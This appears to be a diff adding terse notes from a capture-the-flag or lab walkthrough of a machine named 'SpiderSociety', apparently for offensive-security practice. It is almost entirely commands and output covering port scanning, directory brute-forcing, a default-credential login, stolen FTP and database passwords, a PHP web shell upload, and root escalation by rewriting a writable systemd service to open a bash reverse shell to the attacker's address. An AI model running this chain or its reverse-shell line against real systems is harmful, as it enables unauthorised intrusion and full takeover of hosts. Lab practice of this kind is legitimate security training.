@@ -1,0 +1,93 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.244.214 > SpiderSociety.txt
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
+|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: Spider Society
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: 6415DD3213A122D39F9E526862609952
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+2121/tcp open  ftp     vsftpd 3.0.5
+Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+
+$ gobuster dir -u http://192.168.244.214 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+libspider
+
+http://192.168.244.214/libspider
+# login with admin:admin  . Click communications. Get credential
+ss_ftpbckuser:ss_WeLoveSpiderSociety_From_Tech_Dept5937!
+
+$ ftp 192.168.244.214 -p 2121
+USER ss_ftpbckuser
+PASS ss_WeLoveSpiderSociety_From_Tech_Dept5937!
+# found can put file. put shell.php. remember to chmod 0777. then trigger it in browser.
+
+$ rlwrap nc -nlvp 2121
+listening on [any] 2121 ...
+connect to [192.168.45.154] from (UNKNOWN) [192.168.244.214] 40522
+bash: cannot set terminal process group (1277): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@spidersociety:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/etc/passwd
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+spidey:x:1001:1001::/home/spidey:/bin/bash
+ss_ftpbckuser:x:1002:1002::/var/www/html:/bin/bash
+
+su ss_ftpbckuser with password.
+
+Linux version 6.8.0-48-generic (buildd@lcy02-amd64-010) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.2.0-23ubuntu4) 13.2.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #48-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 27 14:04:52 UTC 2024
+
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),101(lxd)
+
+Sudo version 1.9.15p5
+
+/var/www/html/libspider$ cat .fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
+DB_CONNECT_USER=spidey
+DB_CONNECT_PASS=WithGreatPowerComesGreatSecurity99!
+
+su spidey
+spidey@spidersociety:~$ sudo -l
+Matching Defaults entries for spidey on spidersociety:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User spidey may run the following commands on spidersociety:
+    (ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service
+    (ALL) NOPASSWD: /bin/systemctl daemon-reload
+    (ALL) !/bin/bash, !/bin/sh, !/bin/su, !/usr/bin/sudo
+
+spidey@spidersociety:/tmp$ ls -la /etc/systemd/system/spiderbackup.service
+-rw-rw-r-- 1 spidey spidey 193 Apr 14  2025 /etc/systemd/system/spiderbackup.service
+
+spidey@spidersociety:/tmp$ cat /etc/systemd/system/spiderbackup.service
+[Unit]
+Description=Spider Society Backup Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/spiderbackup.sh
+User=root
+Group=root
+
+[Install]
+WantedBy=multi-user.targe
+
+change this:
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.154/443 0>&1'
+
+sudo /bin/systemctl daemon-reload
+sudo /bin/systemctl restart spiderbackup.service
+$ rlwrap nc -nlvp 443         
+listening on [any] 443 ...
+connect to [192.168.45.154] from (UNKNOWN) [192.168.244.214] 47090
+bash: cannot set terminal process group (52036): Inappropriate ioctl for device
+bash: no job control in this shell
+root@spidersociety:/# id
+uid=0(root) gid=0(root) groups=0(root)
+
